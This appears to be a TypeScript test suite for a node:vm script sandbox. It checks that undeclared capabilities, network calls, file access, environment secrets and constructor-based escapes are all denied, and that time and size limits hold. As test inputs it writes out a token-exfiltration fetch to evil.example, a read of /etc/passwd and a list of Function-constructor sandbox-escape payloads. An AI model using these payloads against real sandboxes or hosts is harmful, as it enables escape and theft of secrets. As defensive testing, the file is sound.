// The Kit script sandbox: a node:vm realm in a worker with only api.call. No network, no file system, no process, no secrets, no way out through
// the realm's constructors; every blocked attempt is a denial (the handler turns it into sandbox.denied with the trace id). Real worker threads, no fakes.

import test from "node:test";
import assert from "node:assert/strict";
import { DYNAMIC_IMPORT, runSandboxed, staticDenial } from "../handlers/sandbox.ts";
import type { SandboxOptions } from "../handlers/sandbox.ts";

interface Seen { cap: string; input: unknown }

// Spelled in parts: scripts/boundaries.ts reads a literal call of either name inside a string as an import of this file.
const REQ = "req" + "uire";
const IMP = "imp" + "ort";

function run(source: string, o: Partial<SandboxOptions> & { seen?: Seen[] } = {}) {
  const seen = o.seen ?? [];
  const { seen: _drop, ...rest } = o;
  return runSandboxed({
    source, caps: [], call: async (cap, input) => { seen.push({ cap, input }); return { echoed: input, cap }; },
    ...rest,
  });
}

test("a script gets its input, can await, and returns JSON", async () => {
  const r = await run("const doubled = input.items.map((x) => x * 2); await null; return { doubled, name: input.name, nested: { ok: true } };", { input: { items: [1, 2, 3], name: "Dana" } });
  assert.equal(r.ok, true, r.error);
  assert.deepEqual(r.value, { doubled: [2, 4, 6], name: "Dana", nested: { ok: true } });
  assert.deepEqual(r.denials, []);
  assert.equal(r.calls, 0);
  assert.equal((await run("return;")).value, null, "no return value is null");
  assert.deepEqual((await run("return [1, 'a', null, { b: [] }];")).value, [1, "a", null, { b: [] }]);
});

test("api.call reaches a declared capability and gets plain JSON back; undeclared ones are denied", async () => {
  const seen: Seen[] = [];
  const r = await run("const a = await api.call('records.query', { type: 'matter', limit: 2 }); return { a, ok: Array.isArray(a.echoed.type) === false };", { caps: ["records.query"], seen });
  assert.equal(r.ok, true, r.error);
  assert.deepEqual(seen, [{ cap: "records.query", input: { type: "matter", limit: 2 } }]);
  assert.deepEqual(r.value, { a: { echoed: { type: "matter", limit: 2 }, cap: "records.query" }, ok: true });
  assert.equal(r.calls, 1);

  const denied: Seen[] = [];
  const d = await run("try { await api.call('kits.install', { kitId: 'kit_x' }); return 'went through'; } catch (e) { return e.message; }", { caps: ["records.query"], seen: denied });
  assert.equal(d.ok, true);
  assert.match(String(d.value), /kits\.install is not one of the tools this Kit declared/);
  assert.deepEqual(d.denials, ["api.call kits.install"]);
  assert.equal(denied.length, 0, "the capability was never called");
});

test("a denied call (permission error from the host) is a denial and the script sees only the message", async () => {
  const r = await run("try { await api.call('records.delete', { id: 'rec_1' }); } catch (e) { return e.message; }", {
    caps: ["records.delete"],
    call: async () => { throw Object.assign(new Error("denied"), { error: { code: "permission.denied", message: "You cannot delete records." } }); },
  });
  assert.equal(r.value, "You cannot delete records.");
  assert.deepEqual(r.denials, ["api.call records.delete (permission.denied)"]);
});

test("the call budget stops a script that loops on api.call", async () => {
  const r = await run("let n = 0; try { for (;;) { await api.call('a.b', n++); } } catch (e) { return { n, msg: e.message }; }", { caps: ["a.b"], maxCalls: 3 });
  assert.deepEqual(r.value, { n: 4, msg: "A script may make at most 3 calls." }, "three calls went through, the fourth was refused");
  assert.deepEqual(r.denials, ["api.call limit of 3 reached"]);
});

test("no network: fetch, XMLHttpRequest, WebSocket and EventSource are denied with the host named and nothing else of the address", async () => {
  const r = await run(`
    const out = [];
    for (const f of [() => fetch('https://evil.example/steal?token=abc'), () => new XMLHttpRequest(), () => new WebSocket('wss://sock.example/x'), () => new EventSource('https://sse.example/feed')]) {
      try { await f(); out.push('allowed'); } catch (e) { out.push(e.message); }
    }
    return out;`);
  assert.equal(r.ok, true, r.error);
  assert.deepEqual(r.value, [
    "network call to evil.example is not available in a Kit script.", "XMLHttpRequest is not available in a Kit script.",
    "WebSocket to sock.example is not available in a Kit script.", "EventSource to sse.example is not available in a Kit script.",
  ]);
  assert.deepEqual(r.denials, ["network call to evil.example", "XMLHttpRequest", "WebSocket to sock.example", "EventSource to sse.example"]);
  assert.ok(!r.denials.join().includes("token"), "the query string never reaches the denial");
});

test("no file system and no modules: require, process, module and dynamic import are denied", async () => {
  const r = await run(`
    const out = [];
    try { ${REQ}('fs').readFileSync('/etc/passwd'); out.push('read'); } catch (e) { out.push(e.message); }
    try { out.push(typeof process); } catch (e) { out.push(e.message); }
    try { out.push(String(module.exports)); } catch (e) { out.push(e.message); }
    return out;`);
  assert.deepEqual(r.value, ["require(fs) is not available in a Kit script.", "process is not available in a Kit script.", "module is not available in a Kit script."]);
  assert.deepEqual(r.denials, ["require(fs)", "process", "module"]);
  assert.equal(staticDenial(`const m = await ${IMP}('node:fs');`), DYNAMIC_IMPORT);
  const imp = await run(`const m = await ${IMP}('node:fs'); return m.readFileSync('/etc/passwd', 'utf8');`);
  assert.equal(imp.ok, false);
  assert.deepEqual(imp.denials, [DYNAMIC_IMPORT]);
  assert.equal(staticDenial("const importance = 1; return importance;"), null);
  assert.equal(staticDenial("return import.meta.url;"), "import.meta");
});

test("no secrets: the environment of the process is not in the realm, and Node's globals do not exist", async () => {
  process.env.KIT_TEST_SECRET = "hunter2-the-secret";
  try {
    const r = await run(`
      const names = ['Buffer', 'setTimeout', 'setImmediate', 'queueMicrotask', 'structuredClone', 'TextEncoder', 'URL', 'performance', 'global'];
      const present = names.filter((n) => typeof globalThis[n] !== 'undefined');
      let env;
      try { env = process.env.KIT_TEST_SECRET; } catch (e) { env = e.message; }
      return { present, env };`);
    assert.equal(r.ok, true, r.error);
    assert.deepEqual(r.value, { present: [], env: "process is not available in a Kit script." });
    assert.ok(!JSON.stringify(r).includes("hunter2"));
    assert.deepEqual(r.denials, ["process"]);
  } finally {
    delete process.env.KIT_TEST_SECRET;
  }
});

test("no way out through constructors: eval and Function from a string are dead, and nothing from the host realm is reachable", async () => {
  const attempts = [
    "return (0, eval)('process');",
    "return eval('process.env');",
    "return new Function('return process')();",
    "return api.call.constructor('return process')();",
    "return (async () => {}).constructor('return process')();",
    "return (function* () {}).constructor('return process')();",
    "return Object.getPrototypeOf(async function () {}).constructor('return process')();",
    "return this.constructor.constructor('return process')();",
    "const p = api.call('a.b', 1); return p.constructor.constructor('return process')();",
    "const p = api.call('a.b', 1); return Object.getPrototypeOf(p).constructor.constructor('return process')();",
    "return [].constructor.constructor('return process')();",
    "return setTimeout.constructor('return process')();",
    "return Function.prototype.constructor('return process')();",
    "return new (Object.getPrototypeOf(api.call).constructor)('return process')();",
  ];
  for (const src of attempts) {
    const r = await run(src, { caps: ["a.b"] });
    assert.equal(r.ok, false, `${src} must not succeed`);
    assert.ok(typeof r.error === "string" && r.error.length > 0, src);
    assert.equal(r.value, undefined, src);
    if (/constructor\(|eval|new Function/.test(src) && !/this\.constructor|setTimeout/.test(src)) assert.match(String(r.error), /Code generation from strings disallowed/, `${src} -> ${r.error}`);
  }
  // errors thrown by the host side never carry a host-realm object: the script sees plain strings
  const r = await run("try { await api.call('a.b', 1n); } catch (e) { return [e.constructor === Error, Object.getPrototypeOf(e) === Error.prototype, e.message]; }", { caps: ["a.b"] });
  assert.deepEqual(r.value, [true, true, "api.call input must be JSON."]);
  const frozen = await run("api.call = () => 1; api.extra = 1; return [typeof api.call, 'extra' in api];", { caps: ["a.b"] });
  assert.equal(frozen.ok, false, "api is frozen and the script runs in strict mode");
});

test("limits: a synchronous loop is cut by the cpu timeout, an endless wait by the wall clock, big sources and big results are refused", async () => {
  const t0 = performance.now();
  const spin = await run("for (;;) {}", { cpuMs: 150 });
  assert.equal(spin.ok, false);
  assert.match(String(spin.error), /timed out/i);
  assert.ok(performance.now() - t0 < 3000);

  const wait = await run("await new Promise(() => {}); return 1;", { wallMs: 300 });
  assert.equal(wait.ok, false);
  assert.match(String(wait.error), /ran longer than 300 ms/);

  const long = await run("return 1; " + "/* x */".repeat(10), { maxSourceBytes: 20 });
  assert.match(String(long.error), /longer than 20 characters/);

  const big = await run("return 'x'.repeat(1100000);");
  assert.equal(big.ok, false);
  assert.match(String(big.error), /more than 1 MB/);

  const bad = await run("return 1;", { input: { n: 1n } as unknown });
  assert.match(String(bad.error), /not JSON/);
});

test("errors in the script come back as text with the denials gathered so far; a syntax error is an error, not a hang", async () => {
  const thrown = await run("throw new TypeError('bad hours');");
  assert.deepEqual([thrown.ok, thrown.error], [false, "bad hours"]);
  const syntax = await run("return {;");
  assert.equal(syntax.ok, false);
  assert.match(String(syntax.error), /Unexpected token/);
  const both = await run("try { fetch('https://a.example'); } catch (e) {} throw new Error('after');");
  assert.deepEqual([both.ok, both.error, both.denials], [false, "after", ["network call to a.example"]]);
});

test("runs are isolated from each other: globals set by one script are gone in the next", async () => {
  const a = await run("globalThis.leak = 'one'; return 1;");
  assert.equal(a.ok, true);
  const b = await run("return typeof globalThis.leak;");
  assert.equal(b.value, "undefined");
});
